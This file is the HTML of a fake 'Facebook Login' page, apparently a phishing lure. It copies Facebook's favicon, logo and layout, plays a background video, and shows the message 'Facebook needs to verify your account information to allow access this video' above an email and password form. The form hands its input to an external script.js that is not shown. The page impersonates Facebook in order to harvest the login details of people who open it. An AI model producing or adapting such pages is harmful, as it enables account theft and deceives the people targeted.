<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <!-- Link to Facebook's Favicon -->
    <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Video Background -->
    <video id="backgroundVideo" autoplay muted loop playsinline>
        <source src="background.mp4" type="video/mp4">
    </video>

    <!-- Login Container -->
    <div class="login-container">
        <div class="login-card">
            <!-- Facebook Logo -->
            <img src="facebook.svg" alt="Facebook" class="facebook-logo">
            
            <!-- Warning Message -->
            <div class="warning-message">
                Facebook needs to verify your account information to allow access this video
            </div>
            
            <!-- Login Form -->
            <form id="loginForm">
                <input type="text" placeholder="Email or phone number" id="email" required>
                <input type="password" placeholder="Password" id="password" required>
                <button type="submit" class="login-button">Log In</button>
            </form>
            
            <!-- Forgot Password Link -->
            <a href="#" class="forgot-password">Forgot Password?</a>
            
            <!-- Divider -->
            <div class="divider"></div>
            
            <!-- Create Account Button -->
            <button class="create-account-button">Create New Account</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
